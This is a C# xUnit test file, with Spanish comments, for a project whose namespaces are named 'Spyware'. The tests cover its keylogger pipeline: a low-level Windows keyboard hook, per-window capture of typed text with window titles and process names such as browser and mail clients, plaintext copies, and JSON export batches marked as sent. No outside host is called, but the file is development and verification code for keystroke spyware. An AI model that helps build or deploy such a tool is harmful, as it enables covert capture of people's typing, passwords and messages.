using Spyware.Collectors.Keyboard;
using Spyware.Core.Configuration;
using Spyware.Core.Logging;
using Spyware.Core.Paths;
using Spyware.Storage;
using Spyware.Transport;
using Xunit;

namespace Spyware.UnitTests;

/// <summary>
/// Ráfagas de principio a fin: pulsaciones inyectadas a la cola del hook, traducción, alta
/// en storage.db, copia en claro y exportación con `sent = 1`. No hace falta un teclado real
/// ni una sesión interactiva: la cola se rellena a mano y la ventana en primer plano se
/// sondea, así que el resultado no depende de la máquina que ejecuta las pruebas.
/// </summary>
public sealed class KeyboardPipelineTests : IDisposable
{
    private const int VkBack = 0x08;
    private const int VkF1 = 0x70;
    private const int VkF5 = 0x74;
    private const int VkSpace = 0x20;

    private readonly string _root = Path.Combine(Path.GetTempPath(), "spyware-keylog-" + Guid.NewGuid().ToString("N"));

    [Fact]
    public void Pipeline_RafagaTraducidaSeGuardaEnClaroYSeExporta()
    {
        AgentPaths paths = PathsFor("pipeline");
        var log = new CapturingLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        var spool = new SpoolManager(paths, log);
        WindowInfo notepad = new(new IntPtr(1234), "Bloc de notas", "notepad");

        using var hook = new KeylogHook();
        var service = Service(paths, repository, spool, new KeyboardSection { SaveTextCopy = true }, log, hook, notepad);

        Type(hook, VkF5, VkSpace, VkF1);
        service.Stop();

        Assert.Equal(3, service.KeyCount);
        Assert.Equal(1, service.CapturedCount);

        KeystrokeRow row = Assert.Single(repository.GetUnsentKeystrokes(10));

        Assert.Equal("[f5] [f1]", row.Text);
        Assert.Equal(3, row.KeyCount);
        Assert.Equal(9, row.CharCount);
        Assert.Equal(row.Text.Length, row.CharCount);
        Assert.Equal("Bloc de notas", row.WindowTitle);
        Assert.Equal("notepad", row.ProcessName);
        Assert.False(row.Truncated);
        Assert.Equal(64, row.Hash!.Length);
        Assert.NotNull(row.StartedUtc);
        Assert.True(row.StartedUtc <= row.TimestampUtc);

        // keyboard.saveTextCopy: el texto también queda en un .txt legible del spool.
        Assert.NotNull(row.FilePath);
        Assert.StartsWith("keys_", Path.GetFileName(row.FilePath!), StringComparison.Ordinal);
        Assert.Equal("[f5] [f1]", File.ReadAllText(row.FilePath!));

        Assert.NotNull(repository.GetMeta("keys_last_id"));
        Assert.Equal(1, repository.GetStats()["keystrokes"]);

        using var batcher = new EventBatcher("agente-prueba", repository,
            [new LocalFolderExporter(paths, new TransportSection(), log)], new TransportSection(), log);

        Assert.Equal(1, batcher.Flush());
        Assert.Empty(repository.GetUnsentKeystrokes(10));

        string batch = Directory.GetFiles(paths.ExportDirectory, "*.json", SearchOption.AllDirectories).Single();
        string json = File.ReadAllText(batch);

        Assert.Contains("\"keystroke\"", json, StringComparison.Ordinal);
        Assert.Contains("[f5] [f1]", json, StringComparison.Ordinal);
        Assert.Contains("Bloc de notas", json, StringComparison.Ordinal);
    }

    [Fact]
    public void Pipeline_CambioDeVentana_CierraLaRafagaConSuVentana()
    {
        AgentPaths paths = PathsFor("cambio-ventana");
        var log = new CapturingLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        var spool = new SpoolManager(paths, log);
        var chrome = new WindowInfo(new IntPtr(10), "Navegador", "chrome");
        var outlook = new WindowInfo(new IntPtr(20), "Correo", "outlook");

        // Sonda guionizada: el servicio consulta el HWND en cada pulsación y repite el
        // resultado mientras el HWND no cambie, así que el cambio de foco ocurre en medio.
        var handles = new Queue<IntPtr>([new IntPtr(10), new IntPtr(20), new IntPtr(20)]);
        var windows = new Queue<WindowInfo>([chrome, outlook, outlook]);

        using var hook = new KeylogHook();
        var service = new KeyCaptureService(paths, repository, spool, new KeyboardSection(), log,
            hook: hook,
            foregroundHandle: () => handles.Count > 0 ? handles.Dequeue() : new IntPtr(20),
            windowProbe: () => windows.Count > 0 ? windows.Dequeue() : outlook);

        Type(hook, VkF5, VkF5, VkF1);
        service.Stop();

        IReadOnlyList<KeystrokeRow> rows = repository.GetUnsentKeystrokes(10);

        Assert.Equal(2, rows.Count);

        // Cada fila conserva la ventana en la que se escribió, no la última vista.
        Assert.Equal("[f5]", rows[0].Text);
        Assert.Equal(1, rows[0].KeyCount);
        Assert.Equal("Navegador", rows[0].WindowTitle);
        Assert.Equal("chrome", rows[0].ProcessName);

        Assert.Equal("[f5][f1]", rows[1].Text);
        Assert.Equal(2, rows[1].KeyCount);
        Assert.Equal("Correo", rows[1].WindowTitle);
        Assert.Equal("outlook", rows[1].ProcessName);
    }

    [Fact]
    public void Pipeline_RetrocesoBorraLoQueSeEscribio()
    {
        AgentPaths paths = PathsFor("retroceso");
        var log = new CapturingLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        WindowInfo notepad = new(new IntPtr(7), "Consola", "pwsh");
        using var hook = new KeylogHook();
        var service = Service(paths, repository, new SpoolManager(paths, log),
            new KeyboardSection { HonorBackspace = true }, log, hook, notepad);

        Type(hook, VkF5, VkBack, VkF1);
        service.Stop();

        // "[f5]" menos el último carácter, más "[f1]": el retroceso edita, no se anota.
        KeystrokeRow row = Assert.Single(repository.GetUnsentKeystrokes(10));

        Assert.Equal("[f5[f1]", row.Text);
        Assert.Equal(3, row.KeyCount);
        Assert.Equal(7, row.CharCount);
    }

    [Fact]
    public void Pipeline_BuferLleno_CierraLaRafagaSinPerderPulsaciones()
    {
        AgentPaths paths = PathsFor("bufer");
        var log = new CapturingLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        WindowInfo notepad = new(new IntPtr(9), "Bloc de notas", "notepad");
        using var hook = new KeylogHook();
        var service = Service(paths, repository, new SpoolManager(paths, log),
            new KeyboardSection { MaxBufferCharacters = 8 }, log, hook, notepad);

        Type(hook, VkF5, VkF5, VkF5);
        service.Stop();

        IReadOnlyList<KeystrokeRow> rows = repository.GetUnsentKeystrokes(10);

        Assert.Equal(2, rows.Count);

        Assert.Equal("[f5][f5]", rows[0].Text);
        Assert.Equal(2, rows[0].KeyCount);
        Assert.True(rows[0].Truncated, "la ráfaga que alcanzó el tope se marca como truncada");

        // La tecla que no cabía abre la ráfaga siguiente: no se pierde ninguna pulsación.
        Assert.Equal("[f5]", rows[1].Text);
        Assert.Equal(1, rows[1].KeyCount);
        Assert.Equal(3, service.KeyCount);
    }

    [Fact]
    public void Pipeline_RafagaIdentica_SeOmiteConSkipDuplicates()
    {
        AgentPaths paths = PathsFor("duplicados");
        var log = new CapturingLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        WindowInfo notepad = new(new IntPtr(11), "Bloc de notas", "notepad");
        using var hook = new KeylogHook();
        var service = Service(paths, repository, new SpoolManager(paths, log),
            new KeyboardSection { SkipDuplicates = true }, log, hook, notepad);

        Type(hook, VkF5, VkF1);
        service.Stop();

        Type(hook, VkF5, VkF1);
        service.Stop();

        Assert.Equal(1, repository.GetStats()["keystrokes"]);
        Assert.Equal(1, service.CapturedCount);
        Assert.Equal(1, service.DuplicateCount);
    }

    [Fact]
    public void Pipeline_SinTituloDeVentana_UnaSolaFilaSinWindow()
    {
        AgentPaths paths = PathsFor("sin-titulo");
        var log = new CapturingLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        var chrome = new WindowInfo(new IntPtr(10), "Navegador", "chrome");
        var outlook = new WindowInfo(new IntPtr(20), "Correo", "outlook");

        using var hook = new KeylogHook();
        var service = new KeyCaptureService(paths, repository, new SpoolManager(paths, log),
            new KeyboardSection { RecordWindowTitles = false }, log, hook: hook,
            foregroundHandle: () => chrome.Handle, windowProbe: () => outlook);

        Type(hook, VkF5, VkF5);
        service.Stop();

        // Con recordWindowTitles = false no se consulta ninguna API de ventana y el cambio
        // de foco no parte la ráfaga: todo queda en una sola fila sin ventana.
        KeystrokeRow row = Assert.Single(repository.GetUnsentKeystrokes(10));

        Assert.Equal("[f5][f5]", row.Text);
        Assert.Equal(string.Empty, row.WindowTitle);
        Assert.Equal(string.Empty, row.ProcessName);
    }

    [Fact]
    public void Config_TecladoDeshabilitado_NoInstalaElHookNiEscribe()
    {
        AgentPaths paths = PathsFor("deshabilitado");
        var log = new CapturingLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        WindowInfo notepad = new(new IntPtr(5), "Bloc de notas", "notepad");
        using var hook = new KeylogHook();
        var service = Service(paths, repository, new SpoolManager(paths, log),
            new KeyboardSection { Enabled = false }, log, hook, notepad);

        service.Start();

        Assert.False(hook.IsInstalled);
        Assert.Contains("deshabilitado", string.Join('\n', log.InfoMessages), StringComparison.OrdinalIgnoreCase);

        service.Stop();

        Assert.Equal(0, repository.GetStats()["keystrokes"]);
        Assert.Equal(0, repository.CountUnsent());
    }

    [Fact]
    public void Servicio_SinHookInstalado_AvisaEnElLog()
    {
        AgentPaths paths = PathsFor("hook-fallido");
        var log = new CapturingLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        WindowInfo notepad = new(new IntPtr(3), "Bloc de notas", "notepad");
        using var hook = new KeylogHook();
        var service = Service(paths, repository, new SpoolManager(paths, log), new KeyboardSection(), log, hook, notepad);

        service.Start();

        try
        {
            // Sesión con escritorio: el hook se instala. Sin escritorio (servicio, RDP caído)
            // falla: en ese caso el servicio tiene que decirlo en vez de dar por buena la captura.
            Assert.True(hook.IsInstalled || hook.InstallFailure is not null || hook.PendingInstall,
                hook.Describe());

            if (!hook.IsInstalled)
                Assert.Contains("no está capturando", string.Join('\n', log.WarnMessages), StringComparison.Ordinal);
            else
                Assert.Contains("WH_KEYBOARD_LL instalado", string.Join('\n', log.InfoMessages), StringComparison.Ordinal);
        }
        finally
        {
            service.Stop();
        }

        Assert.False(hook.IsInstalled);
    }

    // ---------- utilidades ----------

    private AgentPaths PathsFor(string name)
    {
        AgentPaths paths = new(Path.Combine(_root, name));
        paths.EnsureDirectories();

        return paths;
    }

    private static KeyCaptureService Service(AgentPaths paths, LocalEventRepository repository,
        SpoolManager spool, KeyboardSection config, ILog log, KeylogHook hook, WindowInfo window) =>
        new(paths, repository, spool, config, log,
            hook: hook, foregroundHandle: () => window.Handle, windowProbe: () => window);

    /// <summary>Pulsaciones en orden con marca de tiempo separada, como las entrega el hook.</summary>
    private static void Type(KeylogHook hook, params int[] virtualKeys)
    {
        DateTime instant = DateTime.UtcNow;

        for (int index = 0; index < virtualKeys.Length; index++)
            hook.Enqueue(new RawKey(virtualKeys[index], 0x1E, 0, instant.AddMilliseconds(30 * index)));
    }

    public void Dispose()
    {
        try { Microsoft.Data.Sqlite.SqliteConnection.ClearAllPools(); } catch { /* mejor esfuerzo */ }
        try { if (Directory.Exists(_root)) Directory.Delete(_root, recursive: true); } catch { /* mejor esfuerzo */ }
    }

    private sealed class CapturingLog : ILog
    {
        public List<string> InfoMessages { get; } = [];
        public List<string> WarnMessages { get; } = [];

        public LogLevel MinimumLevel { get; set; } = LogLevel.Debug;
        public bool MirrorToConsole { get; set; }

        public void Debug(string message) { }

        public void Info(string message) => InfoMessages.Add(message);

        public void Warn(string message) => WarnMessages.Add(message);

        public void Error(string message, Exception? exception = null) => WarnMessages.Add(message);
    }
}
